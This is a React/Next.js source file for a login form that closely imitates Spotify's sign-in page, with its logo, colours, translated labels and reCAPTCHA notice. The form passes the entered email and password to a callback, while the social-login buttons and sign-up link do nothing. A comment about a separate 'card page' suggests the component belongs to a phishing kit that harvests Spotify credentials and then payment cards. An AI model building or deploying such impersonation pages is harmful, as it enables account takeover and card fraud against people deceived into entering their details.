"use client"

import type React from "react"
import { useState } from "react"
import { SpotifyLogo } from "@/components/spotify-logo"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { t, type Language } from "@/lib/translations"
import Link from "next/link"
// Removed SpotifyHeader and SpotifyFooter as per user request to only show on card page

interface SpotifyLoginFormProps {
  onLoginSuccess?: (email: string, password: string) => void
  language?: Language
}

export function SpotifyLoginForm({ onLoginSuccess, language = "en" }: SpotifyLoginFormProps) {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")

  const handleLogin = () => {
    if (email && password) {
      onLoginSuccess?.(email, password)
    }
  }

  return (
    <div className="flex flex-col min-h-screen w-full bg-[#121212]">
      <main className="flex-1 flex flex-col items-center justify-center py-12">
        <div className="w-full max-w-[324px] flex flex-col items-center px-4">
          {/* Logo */}
          <SpotifyLogo className="w-10 h-10 mb-8" />

          {/* Title */}
          <h1 className="text-2xl sm:text-[32px] font-bold text-white mb-10 text-center">{t("login.title", language)}</h1>

          {/* Email Input */}
          <div className="w-full mb-2">
            <label className="text-xs sm:text-sm font-bold text-white mb-2 block">{t("login.email", language)}</label>
            <Input
              type="text"
              placeholder={t("login.email", language)}
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full h-12 bg-[#121212] border border-[#727272] rounded-[4px] text-white placeholder:text-[#a7a7a7] px-4 focus:border-white focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 hover:border-[#fff] text-base"
            />
          </div>

          {/* Password Input */}
          <div className="w-full mb-2 mt-4">
            <label className="text-xs sm:text-sm font-bold text-white mb-2 block">{t("login.password", language)}</label>
            <Input
              type="password"
              placeholder={t("login.password", language)}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full h-12 bg-[#121212] border border-[#727272] rounded-[4px] text-white placeholder:text-[#a7a7a7] px-4 focus:border-white focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 hover:border-[#fff] text-base"
            />
          </div>

          {/* Continue Button */}
          <Button
            onClick={handleLogin}
            disabled={!email || !password}
            className="w-full h-12 bg-[#1ed760] hover:bg-[#1fdf64] disabled:bg-[#404040] disabled:text-[#a7a7a7] hover:scale-[1.04] text-black font-bold rounded-full mt-5 transition-all text-sm sm:text-base"
          >
            {t("login.logIn", language)}
          </Button>

          {/* Divider */}
          <div className="w-full flex items-center my-8">
            <div className="flex-1 h-px bg-[#292929]" />
            <span className="px-4 text-[#a7a7a7] text-xs sm:text-sm">or</span>
            <div className="flex-1 h-px bg-[#292929]" />
          </div>

          {/* Social Login Buttons */}
          <div className="w-full space-y-2">
            <SocialButton icon={<GoogleIcon />} label={t("login.continueGoogle", language)} />
            <SocialButton icon={<FacebookIcon />} label={t("login.continueFacebook", language)} />
            <SocialButton icon={<AppleIcon />} label={t("login.continueApple", language)} />
          </div>

          {/* Sign Up Link */}
          <div className="mt-10 text-center">
            <span className="text-[#a7a7a7] text-sm sm:text-base">{t("login.noAccount", language)} </span>
            <Link href="#" className="text-white underline hover:text-[#1ed760]">
              {t("login.signUp", language)}
            </Link>
          </div>

          {/* reCAPTCHA Notice */}
          <p className="mt-8 text-[10px] sm:text-[11px] text-[#a7a7a7] text-center leading-relaxed">
            {t("login.recaptchaNotice", language)}
          </p>
        </div>
      </main>

    </div>
  )
}

function SocialButton({ icon, label }: { icon: React.ReactNode; label: string }) {
  return (
    <button className="w-full h-12 flex items-center justify-center gap-3 bg-transparent border border-[#727272] rounded-full text-white font-bold hover:border-white transition-colors relative text-xs sm:text-sm">
      <span className="absolute left-4">{icon}</span>
      <span>{label}</span>
    </button>
  )
}

function GoogleIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24">
      <path
        fill="#EA4335"
        d="M5.26644 9.76453C6.19903 6.93863 8.85469 4.90909 12.0002 4.90909C13.6912 4.90909 15.2184 5.50909 16.4184 6.49091L19.9093 3C17.7821 1.14545 15.0548 0 12.0002 0C7.27031 0 3.19799 2.6983 1.24023 6.65002L5.26644 9.76453Z"
      />
      <path
        fill="#34A853"
        d="M16.0406 18.0142C14.9508 18.718 13.5659 19.0926 12.0002 19.0926C8.86663 19.0926 6.21883 17.0785 5.27682 14.2695L1.2373 17.3366C3.19263 21.2953 7.26484 24.0017 12.0002 24.0017C14.9328 24.0017 17.7353 22.959 19.834 21.0012L16.0406 18.0142Z"
      />
      <path
        fill="#4285F4"
        d="M19.834 21.0012C22.0292 18.9528 23.4545 15.9038 23.4545 12.0001C23.4545 11.2909 23.3455 10.5274 23.1818 9.81824H12V14.4546H18.4364C18.1188 16.0138 17.2663 17.2275 16.0407 18.0143L19.834 21.0012Z"
      />
      <path
        fill="#FBBC05"
        d="M5.27698 14.2695C5.03833 13.5527 4.90909 12.7922 4.90909 12.0001C4.90909 11.2166 5.03444 10.4652 5.2662 9.76468L1.23999 6.65015C0.436587 8.25159 0 10.0715 0 12.0001C0 13.9164 0.444781 15.7286 1.23746 17.3366L5.27698 14.2695Z"
      />
    </svg>
  )
}

function FacebookIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
      <circle cx="12" cy="12" r="12" fill="#1877F2" />
      <path
        fill="#fff"
        d="M16.671 15.469 17.203 12h-3.328V9.75c0-.95.465-1.875 1.956-1.875h1.513V5.156s-1.374-.234-2.686-.234c-2.742 0-4.533 1.662-4.533 4.672V12H7.078v3.469h3.047v8.385a12.09 12.09 0 0 0 3.75 0v-8.385h2.796Z"
      />
    </svg>
  )
}

function AppleIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
      <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.52-3.24 0-1.44.64-2.2.52-3.06-.4-4.84-5.02-4.12-12.66 1.38-12.96 1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.53 4.07ZM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25Z" />
    </svg>
  )
}
